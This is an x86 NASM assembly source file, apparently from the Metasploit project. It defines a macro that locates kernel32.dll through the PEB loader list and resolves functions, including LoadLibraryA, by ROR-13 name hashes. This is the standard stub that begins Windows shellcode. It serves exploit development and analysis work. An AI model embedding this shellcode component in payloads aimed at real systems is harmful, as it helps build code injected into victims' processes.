;      Title:  Win32 kernel32.dll/GetProcAddress/LoadLibraryA
;  Platforms:  Windows NT 4.0, Windows 2000, Windows XP, Windows 2003
;    Authors:  hdm, spoonm, skape, vlad902, dino

[BITS 32]

; HASH macro, etc
%include "_includes.asm"

global _start
_start:

; expects:
;   cld (or does it)
; returns:
;   ebx = kernel32.dll base
;   esi = LGetProcAddress
;   edi = LoadLibraryA
; preserves the stack
; preserves no registers
%macro KERNEL32_INIT 0

  DIRECTION_CLD ; make sure cld
  call LKernel32Base

  ; stealing code is what we do well...
  ; Orignally written by skape (mmiller@hick.org)
  ; Modified and optimized by vlad902 (vlad902@gmail.com)
  ; all based on dino code...

  ; in     - hash of function name
  ; in     - dll base
  ; return - absolute function address
  ; does a ret 0x08! cleans arguments off stack!
LGetProcAddress:
find_fuction:
  pushad
  mov	ebp, [esp + 0x28]         ; dll base
  mov	eax, [ebp + 0x3c]	
  mov	edi, [ebp + eax + 0x78]
  add	edi, ebp
  mov	ecx, [edi + 0x18]
  mov	ebx, [edi + 0x20]
  add	ebx, ebp

find_function_loop:
  jecxz	find_function_finished
  dec	ecx
  mov	esi, [ebx + ecx * 4]
  add	esi, ebp

compute_hash:
  xor	eax,eax
  cdq

compute_hash_again:
  lodsb
  test	al,al
  jz	compute_hash_finished
  ror	edx,0x0d
  add	edx,eax
  jmp	compute_hash_again
compute_hash_finished:
find_function_compare:
  cmp	edx, [esp + 0x24]      ; function hash
  jnz	find_function_loop
  mov	ebx, [edi + 0x24]
  add	ebx, ebp
  mov	cx, [ebx + 2 * ecx]
  mov	ebx, [edi + 0x1c]
  add	ebx, ebp
  add	ebp, [ebx + 4 * ecx]
  mov	[esp + 0x1c], ebp
find_function_finished:
  popad
  ret 0x8

  ; end stolen code

LKernel32Base:
    push byte 0x30
    pop ecx
    mov esi, [fs:ecx]       ; PEB ptr in esi
    mov esi, [esi + 0x0c]   ; LoaderData ptr to LDR_DATA
    mov esi, [esi + 0x1c]   ; flink intialization ptr to LDR_MODULE
    lodsd                   ; kernel32.dll is always second
    mov ebx, [eax + 0x08]   ; save kernel32.dll base in ebx

    pop esi                 ; store LGetProcAddress in esi (from the 1st call)

    push ebx                ; kernel32.dll base
    HASH push, 'LoadLibraryA'
    call esi                ; GetProcAddress(kerne32.dll, LoadLibrary)
    xchg eax, edi           ; move LoadLibraryA to edi

    ; preserve the stack if the includer wants
    
    ; ebx = kernel32.dll base
    ; esi = LGetProcAddress
    ; edi = LoadLibraryA

%endmacro
